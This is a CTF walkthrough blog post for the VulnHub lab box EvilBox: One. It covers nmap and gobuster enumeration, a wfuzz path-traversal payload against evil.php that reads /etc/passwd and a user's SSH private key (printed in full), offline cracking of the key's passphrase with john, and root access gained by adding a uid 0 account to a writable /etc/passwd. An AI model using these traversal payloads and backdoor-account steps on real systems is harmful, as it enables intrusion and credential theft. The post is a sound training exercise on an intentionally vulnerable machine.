# [EvilBox: One](vulnhub.com/entry/evilbox-one,736/)

## fun rating 8/10
## difficulty 2/10

Hello and welcome to my vulnhub walkthrough, I am Infinit3i.

You can find me on:
[Tryhackme](https://tryhackme.com/p/Macr0Dino)
[Hackthebox](https://app.hackthebox.com/profile/95473)
[My Website](https://www.matthewiver.com)

We start by nmaping the box with -sVC like we always do and we only find SSH and HTTP

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/1.png)

We did a long scan with -p- incase there were high ports above what is usually looked at.

We then ran firefox with the website in the background.

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/2.png)

Looks like a normal apache default page.

`Gobuster dir -u 192.168.56.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/3.png)

We found /secret

I then proceed to do a gobuster with /secret added on after.

`gobuster dir -u 192.168.56.105/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php`

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/4.png)

Next we wfuzz on the page we found because rarely do creators of websites create pages that do not lead to anything

`wfuzz -u "http://192.168.56.105/secret/evil.php?FUZZ=../../../../etc/passwd" -w /usr/share/wordlists/wfuzz/general/common.txt --hw 0`

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/5.png)

Finding out that command is how we locate files i look for /etc/passwd
`http://192.168.56.105/secret/evil.php?command=../../../../etc/passwd`

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/6.png)


We notice `mowree` user is added to this box. We need to find his password or id_rsa 

Found his id_rsa file by visiting `http://192.168.56.105/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa`

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/7.png)

Tried `ssh mowree@192.168.56.105 -i mowree_id_rsa`
It asked for a passphrase for the id_rsa file.

We next ssh2john the file then john it and in less than a few seconds we get the passphrase for the id_rsa

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/8.png)

Found `/etc/passwd` is writable with linpeas. We then start creating a user to put into the box
`mkpasswd -m sha-512` and input password and get `$6$TWpfK25blIf8ZNCi$a/xzXpzfrKf.4z8N10R693r64r12yvSKi.fLk.DNZZnWvy2YguRT8nhW7XVxB3V8YBWjVmpY6G6ZXbxD2uRA30`

We then create `infinit3i:$6$TWpfK25blIf8ZNCi$a/xzXpzfrKf.4z8N10R693r64r12yvSKi.fLk.DNZZnWvy2YguRT8nhW7XVxB3V8YBWjVmpY6G6ZXbxD2uRA30:0:0:root:/root:/bin/bash`

We put that line into our new /etc/passwd file and like that we are root

![flag Announcement Image](https://github.com/Infinit3i/CTF-Writeups-from-Infinit3i/blob/642c40d547ccf0ae18e08559f563ebba983ce51a/Vulnhub/EvilBox1/EvilBox1%20Images/9.png)


Thanks for visiting
Please feel free to visit my [website](https://www.matthewiver.com)
